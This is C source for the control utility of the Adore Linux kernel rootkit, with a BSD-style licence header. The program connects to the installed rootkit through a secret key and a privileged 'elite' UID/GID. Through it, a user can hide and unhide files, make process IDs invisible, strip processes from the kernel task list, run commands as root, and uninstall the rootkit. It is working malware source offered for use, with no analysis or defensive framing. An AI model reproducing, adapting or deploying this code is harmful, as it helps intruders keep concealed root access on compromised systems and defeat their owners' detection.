/*
 * Copyright (C) 1999-2005 Stealth.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Stealth.
 * 4. The name Stealth may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <sys/signal.h>
#include <stdlib.h>

#include "libinvisible.h"

extern char **environ;

const char *adore_key = ADORE_KEY;
const uid_t elite_uid = ELITE_UID;
const gid_t elite_gid = ELITE_GID;
const int current_adore = CURRENT_ADORE;

int main(int argc, char *argv[])
{
   	int version;
        char what;
	adore_t *a;	
    
        if (argc < 3 && !(argc == 2 &&
	                 (argv[1][0] == 'U' || argv[1][0] == 'I'))) {
           	printf("Usage: %s {h,u,r,R,i,v,U} [file or PID]\n\n"
		       "       I print info (secret UID etc)\n"
		       "       h hide file\n"
		       "       u unhide file\n"
		       "       r execute as root\n"
		       "       R remove PID forever\n"
		       "       U uninstall adore\n"
		       "       i make PID invisible\n"
		       "       v make PID visible\n\n", argv[0]);
                exit(1);
        }
        what = argv[1][0];
    
	//printf("Checking for adore  0.12 or higher ...\n");

	a = adore_init();
	if (adore_makeroot(a) < 0)
		fprintf(stderr, "Failed to run as root. Trying anyway ...\n");
	
	if ((version = adore_getvers(a)) <= 0 && what != 'I') {
		printf("Adore NOT installed. Exiting.\n");
		exit(1);
	}
	if (version < CURRENT_ADORE) 
		printf("Found adore 1.%d installed. Please update adore.", version);
	else
		printf("Adore 1.%d installed. Good luck.\n", version);
    
        switch (what) {
        
        /* hide file */
        case 'h':
		if (adore_hidefile(a, argv[2]) >= 0)
	        	printf("File '%s' is now hidden.\n", argv[2]);
		else
			printf("Can't hide file.\n");
		break;
		        
        /* unhide file */
        case 'u':
    		if (adore_unhidefile(a, argv[2]) >= 0)
	        	printf("File '%s' is now visible.\n", argv[2]);
		else
			printf("Can't unhide file.\n");
                break;
	/* make pid invisible */
	case 'i':
		if (adore_hideproc(a, (pid_t)atoi(argv[2])) >= 0)
			printf("Made PID %d invisible.\n", atoi(argv[2]));
		else
			printf("Can't hide process.\n");
		break;
	
	/* make pid visible */
	case 'v':
		if (adore_unhideproc(a, (pid_t)atoi(argv[2])) >= 0)
			printf("Made PID %d visible.\n", atoi(argv[2]));
		else
			printf("Can't unhide process.\n");
		break;
        /* execute command as root */
        case 'r': 
		execvp(argv[2], argv+2);
		perror("execve");
		break;
	case 'R':
		if (adore_removeproc(a, (pid_t)atoi(argv[2])) >= 0)
			printf("Removed PID %d from taskstruct\n", atoi(argv[2]));
		else
			printf("Failed to remove proc.\n");
		break;
	/* uninstall adore */
	case 'U':
		if (adore_uninstall(a) >= 0)
			printf("Adore 0.%d de-installed.\n", version);
		else
			printf("Adore wasn't installed.\n");
		break;
	case 'I':
		printf("\nELITE_UID: %u, ELITE_GID=%u, ADORE_KEY=%s "
		       "CURRENT_ADORE=%d\n",
		       elite_uid, elite_gid, adore_key, current_adore);
		break;	
        default:
           	printf("Did nothing or failed.\n");
        }
	return 0;
}

